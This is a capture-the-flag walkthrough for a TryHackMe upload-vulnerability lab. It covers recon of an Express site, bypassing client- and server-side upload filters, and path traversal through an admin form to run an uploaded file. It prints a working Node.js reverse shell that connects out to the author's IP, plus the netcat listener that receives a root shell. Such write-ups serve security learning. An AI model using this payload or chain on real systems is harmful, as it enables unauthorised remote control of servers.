# UploadVulns Task 11
## Description
>It's challenge time!
>
>Head over to `jewel.uploadvulns.thm`.  
>
>Take what you've learned in this room and use it to get a shell on this machine. As per usual, your flag is in `/var/www/`. Bear in mind that this challenge will be an accumulation of everything you've learnt so far, so there may be multiple filters to bypass. The attached wordlist might help. Also remember that not all webservers have a PHP backend...

---
## Introduction
This is the final task in the UploadVulns room following on from a series of tutorials covering upload vulnerabilities, so that's a good a clue to the type of exploits that might be found.  Also provided is a world list containing 3 letter combinations (AAA, AAB, AAC ... all the way to ZZZ), which is confusing at first but it's use soon becomes apparent.

## Discovery
Navigating to jewel.uploadvulns.thm in the browser shows a web page with an upload form.

Inspecting the page source, there are some javascript includes of note:

```html
<script src="assets/js/upload.js"></script>
<script src="assets/js/backgrounds.js"></script>
```

Checking out both of these, backgrounds.js seems to control the background image slide show, which isn't very interesting in and off itself, but did point out to me that the home page background was a slide show, which I had failed to notice before. Back on the home page, right click on the background image-> copy image link gives shows that the image is stored at /content/UAD.jpg. The text on the home page reads :

>Have you got a nice image of a gem or a jewel?  
Upload it here and we'll add it to the slides!

This leads me to think that any uploads will likely be stored in /content.

Uploads.js reveals that the following client-side filtering has been implemented:

```js
//Check File Size
if (event.target.result.length > 50 * 8 * 1024){
	setResponseMsg("File too big", "red");			
	return;
}
//Check Magic Number
if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
	setResponseMsg("Invalid file format", "red");
	return;	
}
//Check File Extension
const extension = fileBox.name.split(".")[1].toLowerCase();
if (extension != "jpg" && extension != "jpeg"){
	setResponseMsg("Invalid file format", "red");
	return;
}
```

Nothing from the site itself seem to tell reveal what's running on the back end, so I used Curl to retrieve the headers:

```bash
curl http://jewel.uploadvulns.thm -v
*   Trying 10.10.183.187:80...
* Connected to jewel.uploadvulns.thm (10.10.183.187) port 80 (#0)
> GET / HTTP/1.1
> Host: jewel.uploadvulns.thm
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.0 (Ubuntu)
< Date: Sun, 24 Apr 2022 18:30:23 GMT
< Content-Type: text/html; charset=UTF-8
< Content-Length: 1514
< Connection: keep-alive
< X-Powered-By: Express
< Access-Control-Allow-Origin: *
< Accept-Ranges: bytes
< Cache-Control: public, max-age=0
< Last-Modified: Fri, 03 Jul 2020 20:57:40 GMT
< ETag: W/"5ea-173167875a0"
< Front-End-Https: on
```

The X-Powered-By header means the site is likely built with [Express.js](https://expressjs.com/) which is a node.js framework.

During the manual examination so far, the /assets and /content folder have been discovered, so I used Gobuster and also discovered /admin and /modules.

```bash
$ gobuster dir -u http://jewel.uploadvulns.thm/ -w ~/Documents/wordlists/seclists/raft-small-directories.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jewel.uploadvulns.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/sketchypea/Documents/wordlists/seclists/raft-small-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/23 23:50:18 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 200) [Size: 1238]
/modules              (Status: 301) [Size: 181] [--> /modules/]
/content              (Status: 301) [Size: 181] [--> /content/]
/assets               (Status: 301) [Size: 179] [--> /assets/] 
/Admin                (Status: 200) [Size: 1238]               
/ADMIN                (Status: 200) [Size: 1238]               
/Content              (Status: 301) [Size: 181] [--> /Content/]
/Assets               (Status: 301) [Size: 179] [--> /Assets/] 
/Modules              (Status: 301) [Size: 181] [--> /Modules/]
                                                               
===============================================================
2022/04/24 00:00:20 Finished
===============================================================
```

/modules was forbidden. /admin shows from with a single text input box. The input box default text reads "enter file to execute" The page reads: 
>As a reminder: use this form to activate modules from the /modules directory.

As this site is built with node.js, it's likely this will be how we trigger an uploaded exploit, rather than just navigating to the file as you might with a php site.

The strange filename of the homepage background image coupled with the provided word list makes me think that any uploads will be renamed with a random three letter combination before being stored in /content, so to be able to confirm this, I use Gobuster to get a baseline for the /content folder:

```bash
$ gobuster dir -u http://jewel.uploadvulns.thm/content/  -w UploadVulnsWordlist.txt -x .jpg
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jewel.uploadvulns.thm/content/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                UploadVulnsWordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              jpg
[+] Timeout:                 10s
===============================================================
2022/04/23 23:33:36 Starting gobuster in directory enumeration mode
===============================================================
/ABH.jpg              (Status: 200) [Size: 705442]
/LKQ.jpg              (Status: 200) [Size: 444808]
/SAD.jpg              (Status: 200) [Size: 247159]
/UAD.jpg              (Status: 200) [Size: 342033]

===============================================================
2022/04/23 23:50:38 Finished
===============================================================
```

## Testing
I uploaded  a test .jpg file using the form, captured the request using browser dev tools and exported as a Curl command (image data replaced with BASE64_DATA_HERE for readability):

```bash
curl 'http://jewel.uploadvulns.thm/' 
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0' 
-H 'Accept: */*' 
-H 'Accept-Language: en-US,en;q=0.5' 
--compressed 
-H 'Content-Type: application/json' 
-H 'X-Requested-With: XMLHttpRequest' 
-H 'Origin: http://jewel.uploadvulns.thm' 
-H 'DNT: 1' 
-H 'Connection: keep-alive' 
-H 'Referer: http://jewel.uploadvulns.thm/' 
-H 'Sec-GPC: 1' 
--data-raw {"name":"test.jpg","type":"image/jpeg","file":"data:image/jpeg;base64,BASE64_DATA_HERE"}'
```

I replaced the image data in the the captured request with the base64 string of a test .txt file and received a success response.

```bash
$ curl 'http://jewel.uploadvulns.thm/' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/json' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: http://jewel.uploadvulns.thm' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://jewel.uploadvulns.thm/' -H 'Sec-GPC: 1' --data-raw '{"name":"test.txt","type":"image/jpeg","file":"data:image/png;base64,dGVzdDEyMwo="}'
success
```

I had expected to encounter some server side filters, so was surprised that this worked. The I realized I hadnn't change the mime type.  I retried with  "name":"test.txt","type":"text/plain" and it received an "invalid" response. This suggested that server side filtering was implemented and was checking the upload mime type.

I ran Gobuster again to check if my hunches about file names  and storage location was correct and there were now two more files in the /content folder. Navigating to the first in the browser revealed it was the test .jpeg, and the second the browser would not display due to errors, suggesting this was likely the .txt file. I used wget to download the file and confirm:

```bash
$ wget http://jewel.uploadvulns.thm/content/WFH.jpg 
$ cat WFH.jpg 
test123
```

## Exploiting
I grabbed a node.js reverse shell from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs) :

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []); 
    var client = new net.Socket();
    client.connect(4242, "10.2.59.82", function(){ 
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

Set the ip in the file, base64 encoded it and uploaded with Curl. Another Gobuster scan on the /content directory provides the file name.

I set up a netcat listener on my machine, then head to /admin. The form tells me it looks in the /modules folder, so I attempt to traverse to /content by entering the following in the input box:

```
../content/IOR.jpg
```

Swapping back to netcat, the reverse shell has worked, I'm connected as root and can navigate to /var/www to get the flag.

```bash
$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.2.59.82] from (UNKNOWN) [10.10.183.187] 38954

$ whoami
root
$ cd /var/www/
$ ls -lash
total 28K
8.0K drwxr-xr-x 1 root root 4.0K Jul  3  2020 .
8.0K drwxr-xr-x 1 root root 4.0K Jul  3  2020 ..
4.0K -rw-r--r-- 1 root root   38 Jul  3  2020 flag.txt
8.0K drwxr-xr-x 1 root root 4.0K Jul  3  2020 html
```


